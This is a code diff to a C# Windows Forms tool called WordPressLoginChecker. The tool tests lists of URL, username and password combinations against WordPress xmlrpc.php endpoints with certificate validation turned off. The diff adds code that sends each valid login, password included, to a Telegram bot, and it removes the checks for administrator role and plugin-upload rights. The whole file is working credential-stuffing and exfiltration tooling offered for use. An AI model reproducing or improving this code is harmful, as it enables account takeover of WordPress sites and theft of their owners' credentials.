@@ -1,4 +1,4 @@
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
@@ -19,14 +19,15 @@ namespace WordPressLoginChecker
 
         static Form1()
         {
-            // Create a handler that ignores SSL certificate errors
             HttpClientHandler handler = new HttpClientHandler
             {
                 ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => true
             };
 
-            // Initialize HttpClient with the custom handler
-            client = new HttpClient(handler);
+            client = new HttpClient(handler)
+            {
+                Timeout = TimeSpan.FromSeconds(30) // Set timeout for HTTP requests
+            };
         }
 
         public Form1()
@@ -91,23 +92,32 @@ namespace WordPressLoginChecker
             {
                 AppendOutput("Operation was canceled.", true);
             }
+            finally
+            {
+                if (cts.IsCancellationRequested)
+                {
+                    AppendOutput("Processing was stopped by the user.", true);
+                }
+                else
+                {
+                    AppendOutput("Processing completed successfully.", false);
+                }
+            }
         }
 
         private void btnStop_Click(object sender, EventArgs e)
         {
-            if (cts != null)
-            {
-                cts.Cancel();
-            }
+            cts?.Cancel();
         }
 
         private void btnBrowseSaveLocation_Click(object sender, EventArgs e)
         {
-            FolderBrowserDialog folderBrowserDialog = new FolderBrowserDialog();
-
-            if (folderBrowserDialog.ShowDialog() == DialogResult.OK)
+            using (FolderBrowserDialog folderBrowserDialog = new FolderBrowserDialog())
             {
-                txtSaveLocation.Text = folderBrowserDialog.SelectedPath;
+                if (folderBrowserDialog.ShowDialog() == DialogResult.OK)
+                {
+                    txtSaveLocation.Text = folderBrowserDialog.SelectedPath;
+                }
             }
         }
 
@@ -125,23 +135,24 @@ namespace WordPressLoginChecker
                     string username = match.Groups[3].Value;
                     string password = match.Groups[4].Value;
 
-                    await CheckLogin(url, username, password, token);
+                    var status = await CheckLogin(url, username, password, token);
+                    AppendOutput($"{url} - {status}", status != "success");
                 }
             }
         }
 
-        private async Task CheckLogin(string url, string username, string password, CancellationToken token)
+        private async Task<string> CheckLogin(string url, string username, string password, CancellationToken token)
         {
             string xmlRpcUrl = Regex.Replace(url, "(wp-login\\.php|wp-admin)$", "xmlrpc.php");
             string xmlRequest = $@"
-        <?xml version=""1.0""?>
-        <methodCall>
-            <methodName>wp.getUsersBlogs</methodName>
-            <params>
-                <param><value><string>{username}</string></value></param>
-                <param><value><string>{password}</string></value></param>
-            </params>
-        </methodCall>";
+    <?xml version=""1.0""?>
+    <methodCall>
+        <methodName>wp.getUsersBlogs</methodName>
+        <params>
+            <param><value><string>{username}</string></value></param>
+            <param><value><string>{password}</string></value></param>
+        </params>
+    </methodCall>";
 
             var content = new StringContent(xmlRequest, Encoding.UTF8, "text/xml");
 
@@ -150,124 +161,94 @@ namespace WordPressLoginChecker
                 HttpResponseMessage response = await client.PostAsync(xmlRpcUrl, content, token);
                 string responseContent = await response.Content.ReadAsStringAsync();
 
-                // Check if the response content is in XML format
                 if (!responseContent.Trim().StartsWith("<?xml"))
                 {
-                    AppendOutput($"===============================\nInvalid XML response from {url}\n===============================", true);
-                    return;
+                    AppendOutput($"Invalid XML response from {url}", true);
+                    return "invalid_xml_response";
                 }
 
                 XDocument xmlResponse = XDocument.Parse(responseContent);
 
                 if (xmlResponse.Descendants("fault").Any())
                 {
-                    AppendOutput($"===============================\nLogin failed for {url} with user {username}\n===============================", true);
+                    return "failed";
                 }
                 else
                 {
-                    bool isAdmin = false;
-                    bool canUploadPlugin = false;
+                    SaveSuccessfulLogin(url, username, password);
 
-                    string matchType = comboBoxMatchType.SelectedItem.ToString();
-                    if (matchType == "Valid Admin" || matchType == "Valid Admin + Upload Plugin")
-                    {
-                        isAdmin = await CheckIfAdmin(xmlRpcUrl, username, password, token);
-                        if (matchType == "Valid Admin + Upload Plugin" && isAdmin)
-                        {
-                            canUploadPlugin = await CheckIfCanUploadPlugin(xmlRpcUrl, username, password, token);
-                        }
-                    }
+                    // Send success message to Telegram
+                    string message = $"🟢 *Success* Wordpress Valid \n`URL:` {url}\n`Username:` {username}\n`Password:` {password}";
+                    await SendToTelegram(message);
 
-                    bool isValid = matchType == "Valid User Only" || (matchType == "Valid Admin" && isAdmin) || (matchType == "Valid Admin + Upload Plugin" && isAdmin && canUploadPlugin);
+                    return "success";
+                }
+            }
+            catch (TaskCanceledException ex) when (token.IsCancellationRequested)
+            {
+                AppendOutput($"Operation was canceled for {url}.", true);
+                return "canceled";
+            }
+            catch (TaskCanceledException)
+            {
+                AppendOutput($"Timeout occurred while checking {url}.", true);
+                return "timeout";
+            }
+            catch (HttpRequestException ex) when (
+                ex.Message.Contains("403") ||
+                ex.Message.Contains("Forbidden"))
+            {
+                AppendOutput($"Access denied (403) for {url}", true);
+                return "access_denied";
+            }
+            catch (HttpRequestException ex) when (
+                ex.InnerException is System.Net.Sockets.SocketException ||
+                ex.Message.Contains("Connection reset") ||
+                ex.Message.Contains("Could not resolve"))
+            {
+                AppendOutput($"Network or SSL error for {url}: {ex.Message}", true);
+                return "network_error";
+            }
+            catch (Exception ex)
+            {
+                AppendOutput($"Unexpected error for {url}: {ex.Message}", true);
+                return "unexpected_error";
+            }
+        }
 
-                    if (isValid)
-                    {
-                        AppendOutput($"===============================\nLogin successful for {url} with user {username}\n===============================", false);
-                        SaveSuccessfulLogin(url, username, password, isAdmin, canUploadPlugin);
-                    }
+
+        private async Task SendToTelegram(string message)
+        {
+            string botToken = telegramBotToken.Text;  // Bot token from UI
+            string chatID = telegramChatID.Text;      // Chat ID from UI
+            string telegramApiUrl = $"https://api.telegram.org/bot{botToken}/sendMessage";
+
+            var payload = new Dictionary<string, string>
+    {
+        { "chat_id", chatID },
+        { "text", message },
+        { "parse_mode", "Markdown" }  // Enable Markdown formatting
+    };
+
+            var content = new FormUrlEncodedContent(payload);
+
+            try
+            {
+                HttpResponseMessage response = await client.PostAsync(telegramApiUrl, content);
+                if (!response.IsSuccessStatusCode)
+                {
+                    AppendOutput($"Failed to send message to Telegram: {response.ReasonPhrase}", true);
                 }
             }
             catch (Exception ex)
             {
-                if (!token.IsCancellationRequested)
-                {
-                    AppendOutput($"===============================\nError checking login for {url}: {ex.Message}\n===============================", true);
-                }
+                AppendOutput($"Error sending message to Telegram: {ex.Message}", true);
             }
         }
-
-
-        private async Task<bool> CheckIfAdmin(string xmlRpcUrl, string username, string password, CancellationToken token)
-        {
-            string xmlRequest = $@"
-                <?xml version=""1.0""?>
-                <methodCall>
-                    <methodName>wp.getProfile</methodName>
-                    <params>
-                        <param><value><string>{username}</string></value></param>
-                        <param><value><string>{password}</string></value></param>
-                    </params>
-                </methodCall>";
-
-            var content = new StringContent(xmlRequest, Encoding.UTF8, "text/xml");
-
-            try
-            {
-                HttpResponseMessage response = await client.PostAsync(xmlRpcUrl, content, token);
-                string responseContent = await response.Content.ReadAsStringAsync();
-
-                XDocument xmlResponse = XDocument.Parse(responseContent);
-
-                var roles = xmlResponse.Descendants("member")
-                                       .Where(m => m.Element("name").Value == "roles")
-                                       .Descendants("value")
-                                       .Select(v => v.Value);
-
-                return roles.Contains("administrator");
-            }
-            catch (Exception)
-            {
-                return false;
-            }
-        }
-
-        private async Task<bool> CheckIfCanUploadPlugin(string xmlRpcUrl, string username, string password, CancellationToken token)
-        {
-            string xmlRequest = $@"
-                <?xml version=""1.0""?>
-                <methodCall>
-                    <methodName>wp.getOptions</methodName>
-                    <params>
-                        <param><value><string>{username}</string></value></param>
-                        <param><value><string>{password}</string></value></param>
-                        <param><value><array><data><value><string>upload_plugins</string></value></data></array></value></param>
-                    </params>
-                </methodCall>";
-
-            var content = new StringContent(xmlRequest, Encoding.UTF8, "text/xml");
-
-            try
-            {
-                HttpResponseMessage response = await client.PostAsync(xmlRpcUrl, content, token);
-                string responseContent = await response.Content.ReadAsStringAsync();
-
-                XDocument xmlResponse = XDocument.Parse(responseContent);
-
-                var uploadPluginsOption = xmlResponse.Descendants("value")
-                                                     .FirstOrDefault(v => v.Element("name").Value == "upload_plugins");
-
-                return uploadPluginsOption != null && uploadPluginsOption.Value == "1";
-            }
-            catch (Exception)
-            {
-                return false;
-            }
-        }
-
-        private void SaveSuccessfulLogin(string url, string username, string password, bool isAdmin, bool canUploadPlugin)
+        private void SaveSuccessfulLogin(string url, string username, string password)
         {
             string successFilePath = Path.Combine(txtSaveLocation.Text, txtOutputFileName.Text);
-            string successEntry = $"{url}:{username}:{password}:IsAdmin={isAdmin}:CanUploadPlugin={canUploadPlugin}\n";
+            string successEntry = $"{url}:{username}:{password}\n";
             File.AppendAllText(successFilePath, successEntry);
         }
 
@@ -287,13 +268,22 @@ namespace WordPressLoginChecker
                 txtOutput.AppendText(text + Environment.NewLine);
                 txtOutput.SelectionColor = System.Drawing.Color.Black;
 
-                // Auto-scroll to the bottom
                 txtOutput.SelectionStart = txtOutput.Text.Length;
                 txtOutput.ScrollToCaret();
             }));
         }
 
         private void groupBox1_Enter(object sender, EventArgs e)
+        {
+            // No implementation needed
+        }
+
+        private void numericUpDown1_ValueChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void textBox2_TextChanged(object sender, EventArgs e)
         {
 
         }
